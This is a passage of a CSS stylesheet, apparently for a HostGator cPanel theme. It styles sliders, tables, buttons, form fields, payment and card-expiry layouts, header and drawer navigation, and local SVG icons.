    @media (min-width: 48em) {
        .slider .slick-arrow {
            opacity: 1;
            visibility: visible
        }
    }

    .slider .slick-arrow.slick-prev {
        left: 0
    }

    .slider .slick-arrow.slick-prev:hover::before {
        border-right-color: #3c638f
    }

    .slider .slick-arrow.slick-prev::before {
        margin-left: -1rem;
        border-right-color: #4b7cb3
    }

    .slider .slick-arrow.slick-next {
        right: 0
    }

    .slider .slick-arrow.slick-next:hover::before {
        border-left-color: #3c638f
    }

    .slider .slick-arrow.slick-next::before {
        margin-left: -0.2rem;
        border-left-color: #4b7cb3
    }

    .slider .slick-arrow::before {
        position: absolute;
        top: 50%;
        left: 50%;
        content: "";
        margin: -0.625rem 0 0 0;
        border: 0.625rem solid transparent;
        transition: border-color 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67)
    }

    .slider .slick-arrow:hover {
        border-color: rgba(103, 150, 192, 0.4)
    }

    .slider .background {
        display: block;
        position: relative;
        width: 100%;
        line-height: 1.2;
        text-align: center;
        color: #4b7cb3;
        padding: 0.625rem 0.625rem 2.375rem 0.625rem;
        background: rgba(103, 150, 192, 0.1);
        border-radius: .25rem
    }

    .slider .background.added {
        color: #360;
        background: rgba(101, 174, 75, 0.1)
    }

    .slider .background.added .button.button-link {
        text-decoration: underline;
        color: #360
    }

    .slider .background.added .button.button-link:hover {
        color: #1a3300
    }

    .slider .background span {
        display: block
    }

    .slider .background span.old {
        text-decoration: line-through;
        padding: 0 0 0.188rem 0
    }

    .slider .background span.new {
        color: #360
    }

    .slider .background strong {
        display: block;
        font-weight: 800;
        font-size: 1.125rem;
        margin: 0 0 0.313rem 0
    }

    .slider .background .bottom {
        display: block;
        position: absolute;
        right: 0;
        bottom: 0;
        left: 0;
        line-height: 1.75rem
    }

    .slider .background .button.button-steel-blue {
        position: absolute;
        right: 0;
        bottom: 0;
        width: 100%;
        padding: 0;
        border-radius: 0 0 .25rem .25rem
    }

    .slider .background .button.button-link {
        position: absolute;
        top: 100%;
        left: 0;
        width: 100%;
        font-size: 0.75rem;
        margin: 0.313rem 0 0 0
    }

    .table {
        position: relative
    }

    @media (min-width: 48em) {
        .table.hide-2 th:nth-child(2),
        .table.hide-2 td:nth-child(2) {
            display: none
        }
    }

    @media (min-width: 75em) {
        .table.hide-2 th:nth-child(2),
        .table.hide-2 td:nth-child(2) {
            display: table-cell
        }
    }

    @media (min-width: 48em) {
        .table.hide-2-6 th:nth-child(2),
        .table.hide-2-6 th:nth-child(6),
        .table.hide-2-6 td:nth-child(2),
        .table.hide-2-6 td:nth-child(6) {
            display: none
        }
    }

    @media (min-width: 75em) {
        .table.hide-2-6 th:nth-child(2),
        .table.hide-2-6 th:nth-child(6),
        .table.hide-2-6 td:nth-child(2),
        .table.hide-2-6 td:nth-child(6) {
            display: table-cell
        }
    }

    .table a {
        text-decoration: underline
    }

    .table a.color-matrix:hover {
        color: #924144
    }

    .table table {
        width: 100%
    }

    .table table thead {
        display: none
    }

    @media (min-width: 48em) {
        .table table thead {
            display: table-header-group
        }
    }

    .table table thead th {
        font-weight: 400;
        text-align: left;
        color: #fff;
        padding: 0.5rem 1rem;
        background: #6796c0
    }

    .table table thead th.current {
        font-weight: 700
    }

    .table table tbody {
        display: block;
        border-top: 0.063rem solid #eee
    }

    @media (min-width: 48em) {
        .table table tbody {
            display: table-row-group;
            border-top: 0
        }
    }

    .table table tbody tr {
        display: block;
        position: relative;
        border-bottom: 0.063rem solid #eee
    }

    @media (min-width: 48em) {
        .table table tbody tr {
            display: table-row;
            border-bottom: 0
        }
    }

    .table table tbody td {
        display: none;
        word-break: break-word
    }

    @media (min-width: 48em) {
        .table table tbody td {
            display: table-cell;
            padding: 0.5rem 1rem;
            border-bottom: 0.063rem solid #eee
        }
    }

    .table table tbody td:first-child {
        display: block;
        position: relative;
        padding: 1.875rem 0.5rem 0.5rem 0.5rem
    }

    @media (min-width: 48em) {
        .table table tbody td:first-child {
            display: table-cell;
            padding: 0.5rem 1rem
        }
    }

    .table table tbody td:first-child::before {
        position: absolute;
        top: 0.5rem;
        left: 0.5rem;
        content: attr(data-title)
    }

    @media (min-width: 48em) {
        .table table tbody td:first-child::before {
            content: none
        }
    }

    .table table tbody td:last-child {
        display: block;
        position: absolute;
        top: 0.7rem;
        right: 0.5rem
    }

    @media (min-width: 48em) {
        .table table tbody td:last-child {
            display: table-cell;
            position: relative;
            top: 0;
            right: 0
        }
    }

    .table table tbody td:last-child .button.button-size-28 {
        height: 2.25rem;
        line-height: 2.25rem
    }

    @media (min-width: 48em) {
        .table table tbody td:last-child .button.button-size-28 {
            height: 1.75rem;
            line-height: 1.75rem
        }
    }

    @media (min-width: 48em) {
        .table table tbody td:last-child:not(:first-child) {
            text-align: right
        }
    }

    .table table tbody td.no-results {
        font-weight: 200;
        font-size: 1.125rem;
        text-align: center;
        color: #4b7cb3;
        padding: 2rem 1rem
    }

    @media (min-width: 48em) {
        .table table tbody td.no-results {
            font-size: 1.5rem;
            padding: 4rem 1rem
        }
    }

    .table table tbody td .button {
        white-space: nowrap
    }

    .table .total {
        padding: 1rem 0 0 0
    }

    @media (min-width: 48em) {
        .table .total {
            text-align: right
        }
    }

    .table .total .left {
        padding: 0 0 0.5rem 0
    }

    @media (min-width: 48em) {
        .table .total .left {
            display: inline-block;
            vertical-align: middle;
            padding: 0.313rem 1rem 0 0
        }
    }

    .table .total .left .due {
        display: block;
        font-weight: 200;
        font-size: 1.5rem;
        line-height: 1;
        color: #f0894f
    }

    @media (min-width: 48em) {
        .table .total .right {
            display: inline-block;
            vertical-align: middle;
            padding: 0 1rem 0 0
        }
    }

    .table .total .button {
        width: 100%
    }

    @media (min-width: 34em) {
        .table .total .button {
            width: auto
        }
    }

    .topics {
        padding: 1rem 0
    }

    @media (min-width: 48em) {
        .topics {
            padding: 2rem 0
        }
    }

    .topics .columns {
        -webkit-flex-flow: column nowrap;
        -moz-flex-flow: column nowrap;
        -ms-flex-flow: column nowrap;
        flex-flow: column nowrap
    }

    @media (min-width: 48em) {
        .topics .columns {
            margin: 0 -1rem 0 0;
            -webkit-flex-flow: row nowrap;
            -moz-flex-flow: row nowrap;
            -ms-flex-flow: row nowrap;
            flex-flow: row nowrap
        }
    }

    .topics .columns .sidebar {
        background: #416b9b
    }

    @media (min-width: 48em) {
        .topics .columns .sidebar {
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 calc((100%/3) - 1rem);
            -moz-box-flex: 0;
            -moz-flex: 0 0 calc((100%/3) - 1rem);
            -ms-flex: 0 0 calc((100%/3) - 1rem);
            flex: 0 0 calc((100%/3) - 1rem)
        }
    }

    .topics .columns .sidebar li {
        font-weight: 200;
        font-size: 1.175rem
    }

    @media (min-width: 48em) {
        .topics .columns .sidebar li {
            font-size: 1.375rem
        }
    }

    .topics .columns .sidebar li.current {
        font-weight: 700
    }

    .topics .columns .sidebar li.current a {
        background: #6796c0
    }

    @media (min-width: 48em) {
        .topics .columns .sidebar li.current a::after {
            position: absolute;
            top: 0;
            bottom: 0;
            left: 100%;
            width: 0.813rem;
            content: "";
            background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/common/arrow.svg");
            background-size: 100% 100%
        }
    }

    .topics .columns .sidebar a {
        display: block;
        position: relative;
        color: #fff;
        padding: 0.675rem 1rem
    }

    .topics .columns .sidebar a:hover {
        background: rgba(103, 150, 192, 0.3)
    }

    .topics .columns .main {
        position: relative;
        padding: 1rem;
        background: #fff
    }

    @media (min-width: 48em) {
        .topics .columns .main {
            padding: 2rem;
            margin: 0 1rem 0 0;
            -webkit-box-flex: 1;
            -webkit-flex: 1 1 auto;
            -moz-box-flex: 1;
            -moz-flex: 1 1 auto;
            -ms-flex: 1 1 auto;
            flex: 1 1 auto
        }
    }

    .topics .columns .main h3 {
        font-weight: 800;
        font-size: 1.175rem;
        color: #416b9b;
        padding: 0 0 0.5rem 0
    }

    @media (min-width: 48em) {
        .topics .columns .main h3 {
            font-size: 1.375rem;
            padding-bottom: 1rem
        }
    }

    .topics .columns .main li:not(:first-child) {
        font-size: 1rem;
        padding: 0.313rem 0 0 0
    }

    .topics .columns .main .more {
        width: 100%
    }

    @media (min-width: 48em) {
        .topics .columns .main .more {
            position: absolute;
            bottom: 1rem;
            left: 1rem;
            width: calc(100% - 2rem)
        }
    }

    .button {
        text-align: center;
        border: 0;
        border-radius: 0;
        -webkit-font-smoothing: antialiased
    }

    .button.button-link {
        text-decoration: none;
        color: #6796c0
    }

    .button.button-link:hover {
        text-decoration: none;
        color: #477dad
    }

    .button.button-link.button-underline {
        font-weight: 500;
        text-decoration: underline
    }

    .button.button-link.button-underline:hover {
        text-decoration: underline
    }

    .button.button-size-28 {
        height: 1.75rem;
        font-weight: 800;
        font-size: 0.875rem;
        line-height: 1.75rem;
        padding: 0 1.5rem
    }

    .button.button-size-28.button-outline {
        line-height: 1.625rem
    }

    .button.button-size-34 {
        height: 2.125rem;
        font-weight: 800;
        font-size: 0.875rem;
        line-height: 1.75rem;
        padding: 0 1.5rem
    }

    .button.button-size-34.button-outline {
        line-height: 2rem
    }

    .button.button-size-40 {
        height: 2.5rem;
        font-weight: 800;
        font-size: 1.125rem;
        line-height: 2.5rem;
        padding: 0 1.5rem
    }

    .button.button-size-40.button-outline {
        line-height: 2.375rem
    }

    .button.button-size-46 {
        height: 2.875rem;
        font-weight: 800;
        font-size: 1.5rem;
        line-height: 2.875rem;
        padding: 0 1.5rem
    }

    .button.button-size-46.button-outline {
        line-height: 2.75rem
    }

    .button.button-size-60 {
        height: 3.75rem;
        font-weight: 800;
        font-size: 1.4rem;
        line-height: 3.75rem;
        padding: 0 1rem
    }

    @media (min-width: 48em) {
        .button.button-size-60 {
            font-size: 1.875rem;
            padding: 0 1.5rem
        }
    }

    .button.button-size-60.button-outline {
        line-height: 3.625rem
    }

    .button.button-jaffa {
        color: #fff;
        background: #f0894f
    }

    .button.button-jaffa:hover {
        background: #ec6920
    }

    .button.button-steel-blue {
        color: #fff;
        background: #4b7cb3
    }

    .button.button-steel-blue:hover {
        background: #3c638f
    }

    .button.button-white {
        color: #6796c0;
        background: #fff
    }

    .button.button-white.button-outline {
        border-color: #6796c0
    }

    .button.button-white:hover {
        color: #477dad
    }

    .button.button-outline {
        border: 0.063rem solid transparent
    }

    .button.button-rounded {
        border-radius: .25rem
    }

    .field {
        display: block;
        width: 100%;
        color: #656565;
        border: 0.063rem solid transparent;
        -webkit-font-smoothing: antialiased
    }

    .field::-webkit-input-placeholder {
        color: rgba(101, 101, 101, 0.5);
        opacity: 1
    }

    .field:-ms-input-placeholder {
        color: rgba(101, 101, 101, 0.5);
        opacity: 1
    }

    .field::-moz-placeholder {
        color: rgba(101, 101, 101, 0.5);
        opacity: 1
    }

    .field.field-size-36 {
        height: 2.25rem;
        font-size: 0.875rem;
        line-height: 2.125rem;
        padding: 0 0.625rem
    }

    .field.field-size-36.field-rounded {
        border-radius: 2.25rem
    }

    .field.field-size-40 {
        height: 2.5rem;
        font-size: 1.125rem;
        line-height: 2.375rem;
        padding: 0 1rem
    }

    .field.field-size-40.field-rounded {
        border-radius: 2.5rem
    }

    .field.field-size-46 {
        height: 2.875rem;
        font-size: 1.25rem;
        line-height: 2.875rem;
        padding: 0 1rem
    }

    .field.field-size-46.field-rounded {
        border-radius: 2.875rem
    }

    .field.field-size-100 {
        height: 6.25rem;
        font-size: 1rem;
        line-height: 1.4;
        padding: 0.75rem 1rem
    }

    .field.field-default {
        color: #656565;
        background: #fff;
        border-color: #6796c0;
        border-radius: .25rem
    }

    .field.field-default::-webkit-input-placeholder {
        color: #6796c0
    }

    .field.field-default:-ms-input-placeholder {
        color: #6796c0
    }

    .field.field-default::-moz-placeholder {
        color: #6796c0
    }

    .field.field-error {
        border-color: #b35357
    }

    .append,
    .prepend {
        position: relative
    }

    .append>*:last-child,
    .prepend>*:last-child {
        position: absolute;
        top: 50%;
        line-height: 2rem;
        margin: -1rem 0 0 0
    }

    .append .field {
        padding-right: 2.75rem
    }

    .append>*:last-child {
        right: 0.75rem
    }

    .prepend .field {
        padding-left: 2.75rem
    }

    .prepend>*:last-child {
        left: 0.75rem
    }

    #drawer {
        position: fixed;
        top: 3.25rem;
        bottom: 0;
        width: 15.625rem;
        background: #4b7cb3;
        z-index: 100;
        -webkit-transform: translate3d(-15.625rem, 0, 0);
        transform: translate3d(-15.625rem, 0, 0);
        transition: -webkit-transform 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67), transform 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67)
    }

    @media (min-width: 62em) {
        #drawer {
            -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0)
        }
    }

    #drawer.active {
        -webkit-transform: translate3d(0, 0, 0);
        transform: translate3d(0, 0, 0)
    }

    #drawer .navigation {
        font-weight: 800;
        font-size: 1.25rem
    }

    #drawer .navigation li {
        border-bottom: 0.063rem solid #6796c0
    }

    #drawer .navigation li .item {
        display: block;
        color: #fff;
        padding: 0.5rem
    }

    #drawer .navigation li .item:hover {
        background: #416b9b
    }

    #drawer .navigation li .item:hover .icon {
        border-color: #ffcf00
    }

    #drawer .navigation li .icon {
        width: 1.625rem;
        height: 1.625rem;
        margin: 0 0.5rem 0 0;
        border-radius: 50%;
        border: 0.063rem solid #fff;
        transition: border-color 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67)
    }

    #drawer .social {
        padding: 1rem
    }

    #drawer .social li {
        float: left;
        width: 20%;
        text-align: center
    }

    #drawer .social li a {
        width: 1.5rem;
        height: 1.5rem;
        color: #fff;
        background: #6796c0;
        border-radius: 50%
    }

    #drawer .social li a:hover {
        color: #6796c0;
        background: #fff
    }

    #drawer .social li a .fa {
        display: block
    }

    #drawer .social li a .fa::before {
        line-height: 1.5rem
    }

    #drawer .ad {
        width: 13.75rem;
        padding: 1rem 0 0 0;
        margin: 0 auto
    }

    #drawer .ad li {
        padding: 0 0 1rem 0
    }

    #drawer .ad li>* {
        display: block;
        max-width: 100%;
        margin: 0 auto
    }

    #footer {
        text-align: center;
        color: #6796c0;
        padding: 1rem
    }

    @media (min-width: 62em) {
        #footer {
            padding: 1.5rem
        }
    }

    #footer li {
        float: left
    }

    #footer li:first-child {
        float: none
    }

    @media (min-width: 48em) {
        #footer li:first-child {
            float: left
        }
    }

    @media (min-width: 48em) {
        #footer li:first-child::after {
            content: "|";
            padding: 0 0.313rem
        }
    }

    #footer li:not(:first-child):not(:last-child)::after {
        content: "|";
        padding: 0 0.313rem
    }

    #header {
        position: fixed;
        top: 0;
        right: 0;
        left: 0;
        padding: 0 1rem;
        background: #fff;
        box-shadow: 0 0 0.126rem rgba(0, 0, 0, 0.1);
        z-index: 999
    }

    #header .menu {
        float: left;
        font-size: 1.5rem;
        line-height: 3.25rem;
        margin: 0 1rem 0 0
    }

    @media (min-width: 62em) {
        #header .menu {
            display: none
        }
    }

    .login #header .menu {
        display: none
    }

    #header h1 {
        float: left
    }

    #header h1 * {
        display: block
    }

    #header h1 a {
        width: 10.313rem;
        overflow: hidden
    }

    body:not(.login) #header h1 a {
        width: 3.188rem
    }

    @media (min-width: 48em) {
        body:not(.login) #header h1 a {
            width: 10.313rem
        }
    }

    #header .right {
        float: right;
        line-height: 1.5rem;
        padding: 0.875rem 0
    }

    #header .right .search {
        position: relative;
        float: left;
        margin: -0.375rem 1rem -0.375rem 0
    }

    #header .right .search .prepend .field {
        visibility: hidden;
        transition: width 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67), padding 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67), opacity 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67)
    }

    @media (min-width: 48em) {
        #header .right .search .prepend .field {
            visibility: visible
        }
    }

    #header .right .search .prepend .field:not(.focus) {
        width: 2rem;
        padding: 0;
        opacity: 0
    }

    #header .right .search .prepend .field.focus {
        padding-left: 2.75rem
    }

    @media (min-width: 48em) {
        #header .right .search .prepend .field.focus {
            width: 15rem
        }
    }

    #header .right .search .prepend .button {
        width: 1.5rem
    }

    @media (min-width: 48em) {
        #header .right .search .prepend .button {
            pointer-events: none
        }
    }

    #header .right .search .popover {
        left: 0;
        margin-top: 1rem
    }

    #header .right .search .popover::before,
    #header .right .search .popover::after {
        left: 50%;
        margin-left: -0.313rem
    }

    #header .right .notification {
        position: relative;
        float: left;
        margin: 0 1rem 0 0
    }

    #header .right .notification .button {
        display: block;
        margin: 0 auto
    }

    #header .right .notification .button .icon {
        display: block
    }

    #header .right .notification .button .number {
        position: absolute;
        right: 0;
        bottom: 0
    }

    #header .right .notification .popover {
        right: -0.5rem
    }

    @media (min-width: 48em) {
        #header .right .notification .popover {
            right: auto;
            left: -3.125rem
        }
    }

    #header .right .notification .popover::before,
    #header .right .notification .popover::after {
        right: 0.5rem
    }

    @media (min-width: 48em) {
        #header .right .notification .popover::before,
        #header .right .notification .popover::after {
            right: auto;
            left: 3.125rem
        }
    }

    #header .right .user {
        position: relative;
        float: left
    }

    #header .right .user .button {
        display: block
    }

    #header .right .user .button .thumbnail {
        display: block;
        float: left;
        width: 1.5rem;
        height: 1.5rem;
        border-radius: 50%
    }

    #header .right .user .button span {
        display: none;
        float: left;
        padding: 0 0 0 0.5rem
    }

    @media (min-width: 48em) {
        #header .right .user .button span {
            display: inline
        }
    }

    #header .right .user .popover {
        right: -0.5rem
    }

    #header .right .user .popover::before,
    #header .right .user .popover::after {
        right: 0.5rem
    }

    #header .right .popover {
        top: 100%;
        margin: 1.375rem 0 0 0
    }

    #header .right .popover::before,
    #header .right .popover::after {
        bottom: 100%
    }

    #header .right .popover::before {
        margin: 0 0 0.063rem 0;
        border-bottom-color: #6796c0
    }

    #header .right .popover::after {
        border-bottom-color: #4b7cb3
    }

    #main {
        padding: 4.25rem 1rem 1rem 1rem
    }

    @media (min-width: 62em) {
        #main {
            padding: 4.75rem 1.5em 1.5rem 1.5rem;
            margin: 0 0 0 15.625rem
        }
    }

    .login #main {
        min-height: calc(100vh - 4.688rem)
    }

    @media (min-width: 48em) {
        .login #main {
            min-height: calc(100vh - 4.375rem)
        }
    }

    @media (min-width: 62em) {
        .login #main {
            margin-left: 0
        }
    }

    .domain-privacy .price {
        font-weight: 200;
        font-size: 1.375rem;
        text-align: center;
        color: #4b7cb3;
        padding: 2rem 0 0.5rem 0;
        margin: 0 0 -2rem 0
    }

    @media (min-width: 48em) {
        .domain-privacy .price {
            font-size: 1.5rem;
            margin-bottom: -4rem
        }
    }

    .domain-privacy .description {
        position: relative
    }

    .domain-privacy .description::before {
        position: absolute;
        top: 50%;
        right: 0;
        left: 0;
        height: 0.063rem;
        content: "";
        background: #bfd3e7
    }

    @media (min-width: 48em) {
        .domain-privacy .description::before {
            top: 0;
            right: auto;
            bottom: 0;
            left: 50%;
            width: 0.063rem;
            height: auto
        }
    }

    .domain-privacy .description::after {
        position: absolute;
        top: 50%;
        left: 50%;
        width: 1.875rem;
        height: 1.875rem;
        font-size: 0.75rem;
        line-height: 1.875rem;
        text-transform: uppercase;
        text-align: center;
        color: #fff;
        content: "or";
        margin: -0.938rem 0 0 -0.938rem;
        background: #f0894f;
        border-radius: 50%
    }

    @media (min-width: 48em) {
        .domain-privacy .description .column {
            float: left;
            width: 50%
        }
    }

    .domain-privacy .description .column:first-child {
        padding: 0 0 2rem 0
    }

    @media (min-width: 48em) {
        .domain-privacy .description .column:first-child {
            padding: 0 2rem 0 0
        }
    }

    .domain-privacy .description .column:last-child {
        padding: 2rem 0 0 0
    }

    @media (min-width: 48em) {
        .domain-privacy .description .column:last-child {
            padding: 0 0 0 2rem
        }
    }

    .domain-privacy .description .background {
        position: relative;
        min-height: 1rem;
        padding: 2rem 1rem;
        border: 0.063rem solid transparent
    }

    @media (min-width: 48em) {
        .domain-privacy .description .background {
            min-height: 23rem
        }
    }

    @media (min-width: 62em) {
        .domain-privacy .description .background {
            padding: 2rem 1rem
        }
    }

    .domain-privacy .description .background.red {
        background: rgba(203, 82, 70, 0.05);
        border-color: #cb5246
    }

    .domain-privacy .description .background.red .title {
        color: #cb5246
    }

    .domain-privacy .description .background.green {
        background: rgba(101, 174, 75, 0.05);
        border-color: #65ae4b
    }

    .domain-privacy .description .background.green::after {
        position: absolute;
        top: 0;
        right: 0;
        width: 6rem;
        height: 6rem;
        content: "";
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/common/recommended.svg");
        background-size: cover
    }

    @media (min-width: 62em) {
        .domain-privacy .description .background.green::after {
            width: 7rem;
            height: 7rem
        }
    }

    .domain-privacy .description .background.green .title {
        color: #65ae4b;
        padding-right: 2rem;
        padding-left: 2rem
    }

    @media (min-width: 34em) {
        .domain-privacy .description .background.green .title {
            padding-right: 0;
            padding-left: 0
        }
    }

    .domain-privacy .description .title {
        display: block;
        font-weight: 800;
        font-size: 1.375rem;
        text-align: center;
        padding: 0 0 0.5rem 0
    }

    @media (min-width: 62em) {
        .domain-privacy .description .title {
            font-size: 1.5rem
        }
    }

    .domain-privacy .description .info {
        text-align: center;
        padding: 0 1rem 0.5rem 1rem
    }

    @media (min-width: 62em) {
        .domain-privacy .description .info {
            padding: 0 2rem 0.5rem 2rem
        }
    }

    .domain-privacy .description .details {
        font-size: 1rem;
        padding: 1rem 0 0 0
    }

    @media (min-width: 62em) {
        .domain-privacy .description .details {
            padding: 1rem 1rem 0 1rem
        }
    }

    .epp-key {
        text-align: center
    }

    .epp-key p {
        padding: 1rem 0 0 0
    }

    .epp-key .key {
        font-weight: 200;
        font-size: 1.5rem;
        color: #4b7cb3
    }

    @media (min-width: 48em) {
        .epp-key .key {
            font-size: 1.875rem
        }
    }

    .tabbed .form:not(.current) {
        display: none
    }

    .form label {
        display: block
    }

    .form label:not(:last-child) {
        padding: 0 0 0.313rem 0
    }

    .form p:not(:last-child) {
        padding: 0 0 0.5rem 0
    }

    .form p a {
        text-decoration: underline
    }

    .form .row:not(:last-child) {
        padding: 0 0 1rem 0
    }

    .form .bar {
        position: relative;
        height: 1.250rem;
        box-shadow: inset 0 0 0 0.063rem #6796c0;
        border-radius: 1.25rem
    }

    .form .bar i {
        position: absolute;
        top: 0;
        bottom: 0;
        left: 0;
        border-radius: 1.25rem
    }

    .form .bar span {
        position: absolute;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        font-weight: 700;
        font-size: 1rem;
        line-height: 1.25rem;
        text-align: center;
        color: #fff
    }

    .form .error-message {
        display: block;
        padding: 0.313rem 0 0 0
    }

    @media (min-width: 48em) {
        .form .digits>* {
            float: left
        }
    }

    .form .digits>*:first-child {
        padding: 0 0 0.5rem 0
    }

    @media (min-width: 48em) {
        .form .digits>*:first-child {
            width: 30%;
            padding: 0 0.5rem 0 0
        }
    }

    @media (min-width: 48em) {
        .form .ns>* {
            float: left
        }
    }

    .form .ns>*:first-child {
        padding: 0 0 0.5rem 0
    }

    @media (min-width: 48em) {
        .form .ns>*:first-child {
            width: 70%;
            padding: 0 0.5rem 0 0
        }
    }

    @media (min-width: 48em) {
        .form .ns>*:last-child {
            width: 30%
        }
    }

    @media (min-width: 48em) {
        .form .generated>* {
            float: left
        }
    }

    .form .generated>*:first-child {
        padding: 0 0 0.5rem 0
    }

    @media (min-width: 48em) {
        .form .generated>*:first-child {
            width: 75%;
            padding: 0 0.5rem 0 0
        }
    }

    @media (min-width: 48em) {
        .form .generated>*:last-child {
            width: 25%
        }
    }

    @media (min-width: 48em) {
        .form .generated .button {
            width: 100%
        }
    }

    .form .change {
        position: relative;
        font-size: 1rem;
        word-break: break-word;
        padding: 0 5rem 0 0
    }

    .form .change .button {
        position: absolute;
        top: 0;
        right: 0
    }

    .form .change .button.button-link {
        text-decoration: underline
    }

    .form .payment-method li:not(:first-child) {
        padding: 0.313rem 0 0 0
    }

    .form .payment-method label {
        line-height: 1.5rem;
        padding: 0.45rem 0.625rem;
        border: 0.063rem solid #6796c0;
        border-radius: .25rem;
        cursor: pointer
    }

    .form .payment-method label .left {
        font-size: 1.125rem;
        color: #4b7cb3
    }

    @media (min-width: 48em) {
        .form .payment-method label .left {
            float: left
        }
    }

    .form .payment-method label .right {
        display: block;
        font-size: 1rem;
        padding: 0.5rem 0 0 0
    }

    @media (min-width: 48em) {
        .form .payment-method label .right {
            float: right;
            padding-top: 0
        }
    }

    .form .payment-method .button {
        width: 100%;
        font-weight: 400;
        text-align: left;
        padding: 0 0.625rem
    }

    .form .prepend-payment-method .select2 .select2-selection .select2-selection__rendered {
        padding-left: 3rem
    }

    .form .prepend-payment-method img {
        top: 0.5rem;
        left: 0.625rem;
        margin-top: 0
    }

    .form .cvv {
        color: #6796c0
    }

    @media (min-width: 48em) {
        .form .cvv>* {
            float: left;
            line-height: 2.5rem
        }
    }

    .form .cvv>*:first-child {
        padding: 0 0 0.5rem 0
    }

    @media (min-width: 48em) {
        .form .cvv>*:first-child {
            width: 30%;
            padding: 0 0.5rem 0 0
        }
    }

    .form .cvv a {
        text-decoration: underline
    }

    .form .expiration {
        color: #6796c0;
        margin: 0 -0.5rem 0 0
    }

    .form .expiration>* {
        float: left;
        width: 50%
    }

    @media (min-width: 48em) {
        .form .expiration>* {
            width: auto;
            line-height: 2.5rem
        }
    }

    .form .expiration>*:not(:last-child) {
        padding: 0 0.5rem 0.5rem 0
    }

    @media (min-width: 48em) {
        .form .expiration>*:not(:last-child) {
            padding: 0 0.5rem 0 0
        }
    }

    @media (min-width: 48em) {
        .form .expiration>*:nth-child(1),
        .form .expiration>*:nth-child(3) {
            width: 30%
        }
    }

    .form .expiration>*:nth-child(2) {
        display: none
    }

    @media (min-width: 48em) {
        .form .expiration>*:nth-child(2) {
            display: block
        }
    }

    .form .total {
        font-weight: 800;
        font-size: 1.5rem;
        text-align: center;
        color: #f0894f;
        padding: 2rem 0 0.5rem 0;
        margin: 0 0 -2rem 0
    }

    @media (min-width: 48em) {
        .form .total {
            font-size: 1.875rem;
            margin-bottom: -4rem
        }
    }

    .paid {
        text-align: center
    }

    .paid img {
        display: block;
        margin: 0 auto 1rem auto
    }

    .paid p:first-of-type {
        font-weight: 800;
        font-size: 1.5rem;
        color: #4b7cb3;
        padding: 0 0 0.5rem 0
    }

    @media (min-width: 48em) {
        .paid p:first-of-type {
            font-size: 1.875rem
        }
    }

    .paid p:not(:first-of-type) {
        font-weight: 300;
        font-size: 1.25rem;
        color: #84b856
    }

    @media (min-width: 48em) {
        .paid p:not(:first-of-type) {
            font-size: 1.5rem
        }
    }

    .profile-picture .crop {
        height: 12.5rem;
        margin: 0 0 1rem 0
    }

    .profile-picture .info {
        position: relative;
        padding: 0.125rem 2rem 0 0
    }

    .profile-picture .info .icon {
        position: absolute;
        top: 0;
        right: 0
    }

    .popover .header .title .number,
    #header .right .notification .button .number {
        width: 0.875rem;
        height: 0.875rem;
        font-weight: 700;
        font-size: 0.625rem;
        line-height: 0.875rem;
        text-align: center;
        color: #fff;
        background: #f0894f;
        border-radius: 50%
    }

    .modal .modal-dialog .modal-content .modal-body .or span,
    .modal .modal-dialog .modal-content .modal-footer span {
        position: relative;
        font-weight: 700;
        font-size: 1.125rem;
        color: #4b7cb3;
        padding: 0 1rem
    }

    .modal .modal-dialog .modal-content .modal-body .or span::before,
    .modal .modal-dialog .modal-content .modal-footer span::before,
    .modal .modal-dialog .modal-content .modal-body .or span::after,
    .modal .modal-dialog .modal-content .modal-footer span::after {
        position: absolute;
        top: 50%;
        width: 31.25em;
        height: 0.056em;
        content: "";
        background: #4b7cb3
    }

    .modal .modal-dialog .modal-content .modal-body .or span::before,
    .modal .modal-dialog .modal-content .modal-footer span::before {
        right: 100%
    }

    .modal .modal-dialog .modal-content .modal-body .or span::after,
    .modal .modal-dialog .modal-content .modal-footer span::after {
        left: 100%
    }

    .color-matrix {
        color: #b35357
    }

    .color-guardsman-red {
        color: #d80000
    }

    .color-mantis {
        color: #84b856
    }

    .color-steel-blue {
        color: #4b7cb3
    }

    .color-hippie-blue {
        color: #6796c0
    }

    .color-jaffa {
        color: #f0894f
    }

    .icon {
        background-position: center center
    }

    .icon.icon-size-16 {
        width: 1rem;
        height: 1rem
    }

    .icon.icon-size-16.icon-close {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/16x16/blue/close.svg")
    }

    .icon.icon-size-16.icon-close.icon-color-white {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/16x16/white/close.svg")
    }

    .icon.icon-size-16.icon-check.icon-color-green {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/16x16/green/check.svg")
    }

    .icon.icon-size-24 {
        width: 1.5rem;
        height: 1.5rem
    }

    .icon.icon-size-24.icon-billing {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/blue/billing.svg")
    }

    .icon.icon-size-24.icon-billing.icon-color-white {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/white/billing.svg")
    }

    .icon.icon-size-24.icon-camera {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/blue/camera.svg")
    }

    .icon.icon-size-24.icon-camera.icon-color-white {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/white/camera.svg")
    }

    .icon.icon-size-24.icon-close {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/blue/close.svg")
    }

    .icon.icon-size-24.icon-close.icon-color-white {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/white/close.svg")
    }

    .icon.icon-size-24.icon-domains {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/blue/domains.svg")
    }

    .icon.icon-size-24.icon-domains.icon-color-white {
